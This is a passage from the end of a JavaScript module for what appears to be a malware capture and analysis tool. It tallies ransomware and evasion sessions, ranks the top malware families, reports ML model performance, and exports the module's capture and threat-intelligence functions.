      ransomware: history.filter(s => s.fileActivity?.some(f => f.action === 'encrypt')).length,
      evasion: history.filter(s => s.evasionTechniques?.length > 0).length
    },
    topThreatFamilies: getTopThreatFamilies(history),
    mlPerformance: {
      accuracy: mlModel.accuracy,
      avgConfidence: history.length > 0 ?
        history.reduce((sum, s) => sum + (s.mlScore || 0), 0) / history.length : 0
    }
  };
}

/**
 * Helper: Get top threat families
 */
function getTopThreatFamilies(history) {
  const families = {};
  
  history.forEach(session => {
    if (session.threat && session.threat.malwareFamily) {
      const family = session.threat.malwareFamily;
      families[family] = (families[family] || 0) + 1;
    }
  });
  
  return Object.entries(families)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([family, count]) => ({ family, count }));
}

export default {
  shouldCapture,
  captureFile,
  getCaptureStats,
  getCaptureHistory,
  getSessionDetails,
  setCaptureEnabled,
  clearCaptureHistory,
  exportCaptureState,
  importCaptureState,
  generateAnalysisReport,
  getMLModelInfo,
  updateMLModel,
  clearThreatIntelCache,
  getThreatIntelStats,
  onCaptureEvent,
  offCaptureEvent,
  getAdvancedStats
};
